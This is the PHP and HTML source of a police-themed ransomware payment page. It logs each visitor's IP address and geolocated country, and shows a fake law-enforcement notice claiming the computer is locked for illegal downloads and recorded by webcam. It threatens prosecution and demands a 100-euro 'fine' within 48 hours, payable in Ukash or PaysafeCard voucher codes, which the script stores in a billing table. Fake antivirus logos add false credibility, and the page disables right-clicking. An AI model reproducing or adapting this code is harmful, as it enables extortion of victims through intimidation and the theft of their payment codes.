<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>

  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  <title></title>

  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

  <link href="style.css" rel="stylesheet" type="text/css">

  <script type="text/javascript" src="jquery1.3.1.js"></script>
  <script type="text/javascript" src="jquerykeypad.js"></script>

  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">

<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>

<div style="left: 0px; width: 470px; top: 130px; height: 638px;" id="Untitled-1-02">All activity of this computer has
been recorded.
If you use webcam, videos and pictures were saved for identification
webcam.<br>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>

<br>

<span style="font-weight: bold;">Your IP-Address:</span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>

You can be clearly identified by your IP address and the associated
hostname<br>

<br>

<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>

<br>

<span style="font-weight: bold;">Illegally downloaded
material (MP3's, Movies or Software) has been
located on your computer</span><br>

<br>

By downloading, those were reproduced, thereby involving a criminal
offense under <span style="font-weight: bold;">Section
106 of Copyright Act</span>.<br>

<br>

The downloading of copyrighted material via the internet or music
sharing networks is illegal and is in accordance with<br>
<span style="font-weight: bold;">
Section 106 of the Copyright Act subject to a fine or imprisonment for
a penalty of up to 3 years</span><br>

<br>

Futhermore, possession of illegally downloaded material is punishable
under <span style="font-weight: bold;">Section 184 paragraph 3</span> of the Criminal Code and may also lead to
the <span style="font-weight: bold;">confiscation of the computer</span>, with which the diles were downloaded</div>

<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03">
Please follow the instruction on the right<br>

<form name="ukash_form" method="get" action="RO.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>

  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>

</form>

<form name="psc_form" method="get" action="RO.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>

  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>

</form>

<br>

<br>

<br>

<span style="color: rgb(255, 0, 0);">Please note:</span>
This fine may only be paid within 48 hours, if you let 48 hours pass
without payment,<br>

&nbsp;the possibility of unlocking your computer expires.<br>

<br>

<span style="font-weight: bold;">In this case a criminal
case against you will be initiated
automatically.</span></div>

<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>

<div style="left: 481px; width: 543px; top: 468px; height: 380px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>

How to unlock?<br>

<br>

</span></span><span id="result_box" class="" lang="en"><span class="hps">In accordance</span>
<span class="hps atn">with the Law <span style="font-weight: bold;">"</span></span><span style="font-weight: bold;">On Control </span><span style="font-weight: bold;" class="hps">and Protection
of Information</span><span style="font-weight: bold;">"</span>
<span class="hps">on</span> <span class="hps">02/01/2012</span>
<span class="hps">You have to pay</span> <span class="hps">a fine of</span> <span class="hps"><span style="font-weight: bold;">100 euros</span>.</span>
<span class="hps">For the convenience of</span> <span class="hps">paying a fine</span> <span class="hps">offer
to use</span> <span class="hps">a secure</span>
<span class="hps">form of payment</span> <span class="hps">through vouchers</span> <span class="hps"><span style="font-weight: bold;">Ukash
/ PaysafeCard</span>.</span> <span class="hps">You
need to buy</span> <span class="hps">vouchers</span>
<span class="hps">in the amount of</span> <span class="hps">EUR 100</span><span>, after</span>
<span class="hps">fill in</span> <span class="hps">the appropriate</span> <span class="hps">fields</span><span class="atn">,
click "</span><span class="">OK"</span></span><br>

<br>

<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>

</div>

</div>

<!-- End ImageReady Slices -->
</body>
</html>
